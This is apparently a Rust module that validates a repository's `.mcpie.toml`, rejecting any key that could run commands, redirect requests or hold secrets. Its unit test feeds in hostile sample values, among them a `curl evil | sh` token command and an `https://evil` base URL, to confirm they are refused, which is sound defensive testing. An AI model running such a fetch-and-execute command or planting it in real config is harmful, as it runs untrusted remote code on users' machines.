//! The repository-level `.mcpie.toml`, restricted to harmless team defaults.
//!
//! A checked-in file must never be able to run commands, redirect requests or carry secrets, so
//! only `sources.<id>.{enabled, tools, default_*}` are accepted; anything else is an error that
//! names the file and the key.

use std::path::{Path, PathBuf};

use super::{ConfigError, PROJECT_FILE};

/// Find the nearest `.mcpie.toml` in `start` or its ancestors.
pub fn find(start: &Path) -> Option<PathBuf> {
    start
        .ancestors()
        .map(|dir| dir.join(PROJECT_FILE))
        .find(|candidate| candidate.is_file())
}

/// Read and validate a project file, returning its table for merging.
pub fn read(path: &Path) -> Result<toml::Table, ConfigError> {
    let text = std::fs::read_to_string(path).map_err(|source| ConfigError::Io {
        path: path.to_owned(),
        source,
    })?;
    let table: toml::Table = toml::from_str(&text).map_err(|error| ConfigError::Parse {
        path: path.to_owned(),
        message: error.to_string(),
    })?;
    validate(&table).map_err(|key| ConfigError::ProjectKey {
        path: path.to_owned(),
        key,
    })?;
    Ok(table)
}

fn validate(table: &toml::Table) -> Result<(), String> {
    for (key, value) in table {
        if key != "sources" {
            return Err(key.clone());
        }
        let Some(sources) = value.as_table() else {
            return Err(key.clone());
        };
        for (id, settings) in sources {
            let Some(settings) = settings.as_table() else {
                return Err(format!("sources.{id}"));
            };
            for field in settings.keys() {
                if !is_allowed_field(field) {
                    return Err(format!("sources.{id}.{field}"));
                }
            }
        }
    }
    Ok(())
}

fn is_allowed_field(field: &str) -> bool {
    matches!(field, "enabled" | "tools") || field.starts_with("default_")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_team_defaults_and_rejects_everything_else() {
        let ok: toml::Table = toml::from_str(
            r#"
            [sources.github]
            enabled = true
            default_owner = "acme"
            tools = ["list_*"]
            "#,
        )
        .unwrap();
        assert!(validate(&ok).is_ok());
        for (text, key) in [
            ("[sources.github]\ntoken = \"x\"", "sources.github.token"),
            (
                "[sources.github]\ntoken_command = \"curl evil | sh\"",
                "sources.github.token_command",
            ),
            (
                "[sources.github]\nbase_url = \"https://evil\"",
                "sources.github.base_url",
            ),
            (
                "[sources.notion]\ncommand = [\"npx\"]",
                "sources.notion.command",
            ),
            ("[server]\nbind = \"0.0.0.0:80\"", "server"),
            ("[http]\ntimeout_seconds = 1", "http"),
        ] {
            let table: toml::Table = toml::from_str(text).unwrap();
            assert_eq!(validate(&table).unwrap_err(), key);
        }
    }
}
